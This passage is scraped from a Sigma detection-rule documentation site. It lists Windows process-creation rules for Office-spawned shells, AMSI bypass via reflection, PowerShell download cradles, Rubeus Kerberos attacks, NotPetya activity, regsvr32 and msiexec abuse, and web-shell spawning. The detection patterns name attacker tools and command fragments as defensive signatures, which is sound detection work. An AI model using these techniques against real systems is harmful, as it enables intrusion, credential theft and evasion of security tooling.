438025f9-5856-4663-83f7-52f878a70a50 status: test description: Detects a Windows command and scripting interpreter executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio author: Michael Haag, Florian Roth, Markus Neis, Elastic, FPT.EagleEye Team references: - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100 - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html date: 2018/04/06 modified: 2022/02/23 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\WINWORD.EXE\u0026#39; - \u0026#39;\\EXCEL.EXE\u0026#39; - \u0026#39;\\POWERPNT.exe\u0026#39; - \u0026#39;\\MSPUB.exe\u0026#39; - \u0026#39;\\VISIO.exe\u0026#39; - \u0026#39;\\MSACCESS.EXE\u0026#39; - \u0026#39;\\EQNEDT32.EXE\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\scrcons.exe\u0026#39; - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\regsvr32.exe\u0026#39; - \u0026#39;\\hh.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/ - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\msiexec.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\scriptrunner.exe\u0026#39; - \u0026#39;\\mftrace.exe\u0026#39; - \u0026#39;\\AppVLP.exe\u0026#39; - \u0026#39;\\svchost.exe\u0026#39; # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html - \u0026#39;\\msbuild.exe\u0026#39; # https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high tags: - attack.execution - attack.t1204.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_office_shell.yml/","tags":["attack.execution","attack.t1204.002"],"title":"Microsoft Office Product Spawning Windows Shell"},{"categories":null,"contents":"Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\nKnown false-positives Legitimate MWC use (unlikely in modern enterprise environments) References https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md Raw rule (edit) title: Microsoft Workflow Compiler id: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d status: experimental description: Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code. tags: - attack.defense_evasion - attack.execution - attack.t1127 - attack.t1218 author: Nik Seetharaman, frack113 date: 2019/01/16 modified: 2021/07/13 references: - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\Microsoft.Workflow.Compiler.exe\u0026#39; selection_t1218: OriginalFileName: \u0026#39;Microsoft.Workflow.Compiler.exe\u0026#39; CommandLine|contains: \u0026#39;.xml\u0026#39; condition: selection or selection_t1218 fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate MWC use (unlikely in modern enterprise environments) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_workflow_compiler.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1127","attack.t1218"],"title":"Microsoft Workflow Compiler"},{"categories":null,"contents":"Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report\nKnown false-positives Unknown References https://codewhitesec.blogspot.com/2018/07/lethalhta.html Raw rule (edit) title: MSHTA Spwaned by SVCHOST id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 status: test description: Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report author: Markus Neis references: - https://codewhitesec.blogspot.com/2018/07/lethalhta.html date: 2018/06/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\svchost.exe\u0026#39; Image|endswith: \u0026#39;\\mshta.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lethalhta.yml/","tags":["attack.defense_evasion","attack.t1218.005"],"title":"MSHTA Spwaned by SVCHOST"},{"categories":null,"contents":"Detects suspicious msiexec process starts with web addresses as parameter\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/ Raw rule (edit) title: MsiExec Web Install id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f status: test description: Detects suspicious msiexec process starts with web addresses as parameter author: Florian Roth references: - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/ date: 2018/02/09 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39; msiexec\u0026#39; - \u0026#39;://\u0026#39; condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1218.007 - attack.command_and_control - attack.t1105 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_msiexec_web_install.yml/","tags":["attack.defense_evasion","attack.t1218.007","attack.command_and_control","attack.t1105"],"title":"MsiExec Web Install"},{"categories":null,"contents":"Detects execution of Net.exe, whether suspicious or benign.\nKnown false-positives Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine following the search for easy hunting by computer/CommandLine. References https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe Raw rule (edit) title: Net.exe Execution id: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac status: experimental description: Detects execution of Net.exe, whether suspicious or benign. references: - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements) date: 2019/01/16 modified: 2021/12/06 tags: - attack.discovery - attack.t1007 - attack.t1049 - attack.t1018 - attack.t1135 - attack.t1201 - attack.t1069.001 - attack.t1069.002 - attack.t1087.001 - attack.t1087.002 - attack.lateral_movement - attack.t1021.002 - attack.s0039 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; cmdline: CommandLine|contains: - \u0026#39; group\u0026#39; - \u0026#39; localgroup\u0026#39; - \u0026#39; user\u0026#39; - \u0026#39; view\u0026#39; - \u0026#39; share\u0026#39; - \u0026#39; accounts\u0026#39; - \u0026#39; stop \u0026#39; - \u0026#39; start\u0026#39; condition: selection and cmdline fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine following the search for easy hunting by computer/CommandLine. level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml/","tags":["attack.discovery","attack.t1007","attack.t1049","attack.t1018","attack.t1135","attack.t1201","attack.t1069.001","attack.t1069.002","attack.t1087.001","attack.t1087.002","attack.lateral_movement","attack.t1021.002","attack.s0039"],"title":"Net.exe Execution"},{"categories":null,"contents":"Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil\nKnown false-positives Admin activity References https://securelist.com/schroedingers-petya/78870/ https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100 Raw rule (edit) title: NotPetya Ransomware Activity id: 79aeeb41-8156-4fac-a0cd-076495ab82a1 status: test description: Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil author: Florian Roth, Tom Ueltschi references: - https://securelist.com/schroedingers-petya/78870/ - https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100 date: 2019/01/16 modified: 2022/03/05 logsource: category: process_creation product: windows detection: select_pipe_com: CommandLine|contains|all: - \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; - \u0026#39;\\\\\\\\.\\\\pipe\\\\\u0026#39; select_rundll32_dash1: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|endswith: - \u0026#39;.dat,#1\u0026#39; - \u0026#39;.dat #1\u0026#39; # Sysmon removes comma select_perfc_keyword: - \u0026#39;\\perfc.dat\u0026#39; condition: 1 of select* fields: - CommandLine - ParentCommandLine falsepositives: - Admin activity level: critical tags: - attack.defense_evasion - attack.t1218.011 - attack.t1070.001 - attack.credential_access - attack.t1003.001 - car.2016-04-002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_notpetya.yml/","tags":["attack.defense_evasion","attack.t1218.011","attack.t1070.001","attack.credential_access","attack.t1003.001","car.2016-04-002"],"title":"NotPetya Ransomware Activity"},{"categories":null,"contents":"Detects a ping command that uses a hex encoded IP address\nKnown false-positives Unlikely, because no sane admin pings IP addresses in a hexadecimal form References https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.can https://twitter.com/vysecurity/status/977198418354491392 Raw rule (edit) title: Ping Hex IP id: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd status: test description: Detects a ping command that uses a hex encoded IP address author: Florian Roth references: - https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.can - https://twitter.com/vysecurity/status/977198418354491392 date: 2018/03/23 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\ping.exe\u0026#39; CommandLine|contains: \u0026#39;0x\u0026#39; condition: selection fields: - ParentCommandLine falsepositives: - Unlikely, because no sane admin pings IP addresses in a hexadecimal form level: high tags: - attack.defense_evasion - attack.t1140 - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ping_hex_ip.yml/","tags":["attack.defense_evasion","attack.t1140","attack.t1027"],"title":"Ping Hex IP"},{"categories":null,"contents":"Detects execution of executables that can be used to bypass Applocker whitelisting\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment Using installutil to add features for .NET applications (primarily would occur in developer environments) References https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md Raw rule (edit) title: Possible Applocker Bypass id: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719 status: test description: Detects execution of executables that can be used to bypass Applocker whitelisting author: juju4 references: - https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt - https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/T1127.001.md date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;\\msdt.exe\u0026#39; - \u0026#39;\\installutil.exe\u0026#39; - \u0026#39;\\regsvcs.exe\u0026#39; - \u0026#39;\\regasm.exe\u0026#39; # - \u0026#39;\\regsvr32.exe\u0026#39; # too many FPs, very noisy - \u0026#39;\\msbuild.exe\u0026#39; - \u0026#39;\\ieexec.exe\u0026#39; #- \u0026#39;\\mshta.exe\u0026#39; #- \u0026#39;\\csc.exe\u0026#39; condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Using installutil to add features for .NET applications (primarily would occur in developer environments) level: low tags: - attack.defense_evasion - attack.t1218.004 - attack.t1218.009 - attack.t1127.001 - attack.t1218.005 - attack.t1218 # no way to map 1:1, so the technique level is required ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_possible_applocker_bypass.yml/","tags":["attack.defense_evasion","attack.t1218.004","attack.t1218.009","attack.t1127.001","attack.t1218.005","attack.t1218"],"title":"Possible Applocker Bypass"},{"categories":null,"contents":"Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html Raw rule (edit) title: Possible Shim Database Persistence via sdbinst.exe id: 517490a7-115a-48c6-8862-1a481504d5a8 status: experimental description: Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications. references: - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html tags: - attack.persistence - attack.privilege_escalation - attack.t1546.011 author: Markus Neis date: 2019/01/16 modified: 2021/08/14 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\sdbinst.exe\u0026#39; CommandLine|contains: \u0026#39;.sdb\u0026#39; filter: CommandLine|contains: - \u0026#39;iisexpressshim.sdb\u0026#39; # normal behaviour for IIS Express (e.g. https://www.hybrid-analysis.com/sample/15d4ff941f77f7bdfc9dfb2399b7b952a0a2c860976ef3e835998ff4796e5e91?environmentId=120) condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_sdbinst_shim_persistence.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.011"],"title":"Possible Shim Database Persistence via sdbinst.exe"},{"categories":null,"contents":"Detects Request to amsiInitFailed that can be used to disable AMSI Scanning\nKnown false-positives Potential Admin Activity References https://twitter.com/mattifestation/status/735261176745988096 https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120 Raw rule (edit) title: Powershell AMSI Bypass via .NET Reflection id: 30edb182-aa75-42c0-b0a9-e998bb29067c status: test description: Detects Request to amsiInitFailed that can be used to disable AMSI Scanning author: Markus Neis references: - https://twitter.com/mattifestation/status/735261176745988096 - https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120 date: 2018/08/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;System.Management.Automation.AmsiUtils\u0026#39; selection2: CommandLine|contains: - \u0026#39;amsiInitFailed\u0026#39; condition: selection1 and selection2 falsepositives: - Potential Admin Activity level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_amsi_bypass.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Powershell AMSI Bypass via .NET Reflection"},{"categories":null,"contents":"Detects Base64 encoded Shellcode\nKnown false-positives Unknown References https://twitter.com/cyb3rops/status/1063072865992523776 Raw rule (edit) title: PowerShell Base64 Encoded Shellcode id: 2d117e49-e626-4c7c-bd1f-c3c0147774c8 status: stable description: Detects Base64 encoded Shellcode author: Florian Roth references: - https://twitter.com/cyb3rops/status/1063072865992523776 date: 2018/11/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: \u0026#39;AAAAYInlM\u0026#39; selection2: CommandLine|contains: - \u0026#39;OiCAAAAYInlM\u0026#39; - \u0026#39;OiJAAAAYInlM\u0026#39; condition: selection1 and selection2 falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1027 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_b64_shellcode.yml/","tags":["attack.defense_evasion","attack.t1027"],"title":"PowerShell Base64 Encoded Shellcode"},{"categories":null,"contents":"Detects a Powershell process that contains download commands in its command line string\nKnown false-positives unknown Raw rule (edit) title: PowerShell Download from URL id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7 status: test description: Detects a Powershell process that contains download commands in its command line string author: Florian Roth, oscd.community, Jonhnathan Ribeiro date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; CommandLine|contains|all: - \u0026#39;new-object\u0026#39; - \u0026#39;net.webclient).\u0026#39; - \u0026#39;download\u0026#39; CommandLine|contains: - \u0026#39;string(\u0026#39; - \u0026#39;file(\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powershell_download.yml/","tags":["attack.execution","attack.t1059.001"],"title":"PowerShell Download from URL"},{"categories":null,"contents":"Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder\nKnown false-positives Administrative scripts References https://twitter.com/JohnLaTwC/status/1082851155481288706 https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03 Raw rule (edit) title: PowerShell Script Run in AppData id: ac175779-025a-4f12-98b0-acdaeb77ea85 status: experimental description: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder references: - https://twitter.com/JohnLaTwC/status/1082851155481288706 - https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03 tags: - attack.execution - attack.t1059.001 author: Florian Roth, Jonhnathan Ribeiro, oscd.community date: 2019/01/09 modified: 2021/11/28 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - \u0026#39;powershell.exe\u0026#39; - \u0026#39;\\powershell\u0026#39; selection2: CommandLine|contains|all: - \u0026#39;/c \u0026#39; - \u0026#39;\\AppData\\\u0026#39; CommandLine|contains: - \u0026#39;Local\\\u0026#39; - \u0026#39;Roaming\\\u0026#39; condition: selection1 and selection2 falsepositives: - Administrative scripts level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ps_appdata.yml/","tags":["attack.execution","attack.t1059.001"],"title":"PowerShell Script Run in AppData"},{"categories":null,"contents":"Detects a PsExec service start\nKnown false-positives Administrative activity Raw rule (edit) title: PsExec Service Start id: 3ede524d-21cc-472d-a3ce-d21b568d8db7 status: test description: Detects a PsExec service start author: Florian Roth date: 2018/03/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine: C:\\Windows\\PSEXESVC.exe condition: selection falsepositives: - Administrative activity level: low tags: - attack.execution - attack.s0029 - attack.t1569.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_psexesvc_start.yml/","tags":["attack.execution","attack.s0029","attack.t1569.002"],"title":"PsExec Service Start"},{"categories":null,"contents":"Detects multiple suspicious process in a limited timeframe\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://car.mitre.org/wiki/CAR-2013-04-002 Raw rule (edit) title: Quick Execution of a Series of Suspicious Commands id: 61ab5496-748e-4818-a92f-de78e20fe7f1 description: Detects multiple suspicious process in a limited timeframe status: experimental references: - https://car.mitre.org/wiki/CAR-2013-04-002 author: juju4 date: 2019/01/16 modified: 2021/06/13 tags: - car.2013-04-002 - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - arp.exe - at.exe - attrib.exe - cscript.exe - dsquery.exe - hostname.exe - ipconfig.exe - mimikatz.exe - nbtstat.exe - net.exe - netsh.exe - nslookup.exe - ping.exe - quser.exe - qwinsta.exe - reg.exe - runas.exe - sc.exe - schtasks.exe - ssh.exe - systeminfo.exe - taskkill.exe - telnet.exe - tracert.exe - wscript.exe - xcopy.exe - pscp.exe - copy.exe - robocopy.exe - certutil.exe - vssadmin.exe - powershell.exe - wevtutil.exe - psexec.exe - bcedit.exe - wbadmin.exe - icacls.exe - diskpart.exe timeframe: 5m condition: selection | count() by MachineName \u0026gt; 5 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_multiple_suspicious_cli.yml/","tags":["car.2013-04-002","attack.execution","attack.t1059"],"title":"Quick Execution of a Series of Suspicious Commands"},{"categories":null,"contents":"Detects various anomalies in relation to regsvr32.exe\nKnown false-positives Unknown References https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ Raw rule (edit) title: Regsvr32 Anomaly id: 8e2b24c9-4add-46a0-b4bb-0057b4e6187d status: experimental description: Detects various anomalies in relation to regsvr32.exe author: Florian Roth, oscd.community date: 2019/01/16 modified: 2021/07/18 references: - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/ tags: - attack.defense_evasion - attack.t1218.010 - car.2019-04-002 - car.2019-04-003 logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; CommandLine|contains: \u0026#39;\\Temp\\\u0026#39; selection2: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; ParentImage|endswith: \u0026#39;\\powershell.exe\u0026#39; selection3: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; ParentImage|endswith: \u0026#39;\\cmd.exe\u0026#39; selection4: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/i:\u0026#39; CommandLine|contains: - \u0026#39;http\u0026#39; - \u0026#39;ftp\u0026#39; CommandLine|endswith: \u0026#39;scrobj.dll\u0026#39; selection5: Image|endswith: \u0026#39;\\wscript.exe\u0026#39; ParentImage|endswith: \u0026#39;\\regsvr32.exe\u0026#39; selection6: Image|endswith: \u0026#39;\\EXCEL.EXE\u0026#39; CommandLine|contains: \u0026#39;..\\..\\..\\Windows\\System32\\regsvr32.exe \u0026#39; selection7: ParentImage|endswith: \u0026#39;\\mshta.exe\u0026#39; Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; selection8: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; CommandLine|contains: - \u0026#39;\\AppData\\Local\u0026#39; - \u0026#39;C:\\Users\\Public\u0026#39; condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_regsvr32_anomalies.yml/","tags":["attack.defense_evasion","attack.t1218.010","car.2019-04-002","car.2019-04-003"],"title":"Regsvr32 Anomaly"},{"categories":null,"contents":"Detects the execution of whoami that has been renamed to a different name to avoid detection\nKnown false-positives Unknown References https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ Raw rule (edit) title: Renamed Whoami Execution id: f1086bf7-a0c4-4a37-9102-01e573caf4a0 status: experimental description: Detects the execution of whoami that has been renamed to a different name to avoid detection references: - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/ - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/ author: Florian Roth date: 2021/08/12 tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: \u0026#39;whoami.exe\u0026#39; filter: Image|endswith: \u0026#39;\\whoami.exe\u0026#39; condition: selection and not filter falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_renamed_whoami.yml/","tags":["attack.discovery","attack.t1033","car.2016-03-001"],"title":"Renamed Whoami Execution"},{"categories":null,"contents":"Detects command line parameters used by Rubeus hack tool\nKnown false-positives unlikely References https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ Raw rule (edit) title: Rubeus Hack Tool id: 7ec2c172-dceb-4c10-92c9-87c1881b7e18 status: stable description: Detects command line parameters used by Rubeus hack tool author: Florian Roth references: - https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ date: 2018/12/19 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39; asreproast \u0026#39; - \u0026#39; dump /service:krbtgt \u0026#39; - \u0026#39; kerberoast \u0026#39; - \u0026#39; createnetonly /program:\u0026#39; - \u0026#39; ptt /ticket:\u0026#39; - \u0026#39; /impersonateuser:\u0026#39; - \u0026#39; renew /ticket:\u0026#39; - \u0026#39; asktgt /user:\u0026#39; - \u0026#39; harvest /interval:\u0026#39; - \u0026#39; s4u /user:\u0026#39; - \u0026#39; s4u /ticket:\u0026#39; - \u0026#39; hash /password:\u0026#39; condition: selection falsepositives: - unlikely level: critical tags: - attack.credential_access - attack.t1003 - attack.t1558.003 - attack.lateral_movement - attack.t1550.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hack_rubeus.yml/","tags":["attack.credential_access","attack.t1003","attack.t1558.003","attack.lateral_movement","attack.t1550.003"],"title":"Rubeus Hack Tool"},{"categories":null,"contents":"Detects the creation of scheduled tasks in user session\nKnown false-positives Administrative activity Software installation Raw rule (edit) title: Scheduled Task Creation id: 92626ddd-662c-49e3-ac59-f6535f12d189 status: experimental description: Detects the creation of scheduled tasks in user session author: Florian Roth date: 2019/01/16 modified: 2021/08/26 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\schtasks.exe\u0026#39; CommandLine|contains: \u0026#39; /create \u0026#39; filter: User|startswith: - \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; - \u0026#39;AUTORITE NT\\Sys\u0026#39; # French language settings condition: selection and not filter fields: - CommandLine - ParentCommandLine tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.t1053.005 - attack.s0111 - car.2013-08-001 falsepositives: - Administrative activity - Software installation level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_schtask_creation.yml/","tags":["attack.execution","attack.persistence","attack.privilege_escalation","attack.t1053.005","attack.s0111","car.2013-08-001"],"title":"Scheduled Task Creation"},{"categories":null,"contents":"Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack\nKnown false-positives Particular web applications may spawn a shell process legitimately Raw rule (edit) title: Shells Spawned by Web Servers id: 8202070f-edeb-4d31-a010-a26c72ac5600 status: test description: Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack author: Thomas Patzke date: 2019/01/16 modified: 2022/01/06 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\w3wp.exe\u0026#39; - \u0026#39;\\httpd.exe\u0026#39; - \u0026#39;\\nginx.exe\u0026#39; - \u0026#39;\\php-cgi.exe\u0026#39; - \u0026#39;\\tomcat.exe\u0026#39; - \u0026#39;\\UMWorkerProcess.exe\u0026#39; # https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html - \u0026#39;\\ws_TomcatService.exe\u0026#39; # https://digital.nhs.uk/cyber-alerts/2022/cc-4002 Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Particular web applications may spawn a shell process legitimately level: high tags: - attack.persistence - attack.t1505.003 - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_webshell_spawn.yml/","tags":["attack.persistence","attack.t1505.003","attack.t1190"],"title":"Shells Spawned by Web Servers"},{"categories":null,"contents":"Detects a suspicious Microsoft certutil execution with sub commands like \u0026lsquo;decode\u0026rsquo; sub command, which is sometimes used to decode malicious code with the built-in certutil utility\nKnown false-positives False positives depend on scripts and administrative tools used in the monitored environment References https://twitter.com/JohnLaTwC/status/835149808817991680 https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/ https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/ https://twitter.com/egre55/status/1087685529016193025 https://lolbas-project.github.io/lolbas/Binaries/Certutil/ Raw rule (edit) title: Suspicious Certutil Command id: e011a729-98a6-4139-b5c4-bf6f6dd8239a status: experimental description: Detects a suspicious Microsoft certutil execution with sub commands like 